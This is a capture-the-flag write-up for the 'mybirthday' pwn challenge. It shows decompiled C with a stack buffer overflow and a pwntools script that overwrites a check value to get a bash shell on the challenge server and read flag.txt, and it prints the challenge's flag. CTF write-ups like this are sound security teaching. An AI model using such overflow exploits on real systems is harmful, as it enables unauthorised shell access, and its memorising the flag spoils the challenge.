## mybirthday

#### Solved by nhanlun

```
Can you guess my birthday? Or you can just gimme the flag :)

nc 61.28.237.24 30200

author: pakkunandy
```

Open `mybirthday` with Ghidra:

```cpp
undefined4 main(void)
{
  undefined local_2c [24];
  int local_14;
  undefined *local_10;

  local_10 = &stack0x00000004;
  local_14 = 0xfeefeffe;
  setup();
  puts("Tell me your birthday?");
  read(0,local_2c,30);
  if (local_14 == 0xcabbfeff) {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  return 0;
}
```

We use buffer overflow to overwrite `local_14` with 0xcabbfeff to pass the check:

```py
from pwn import *
conn = remote('61.28.237.24', 30200)
conn.sendlineafter("?", b'a' * 24 + p32(0xcabbfeff))
conn.interactive()
ls
cat flag.txt
```

Flag: `HCMUS-CTF{Just_A_Warm_Up_Pwn}`
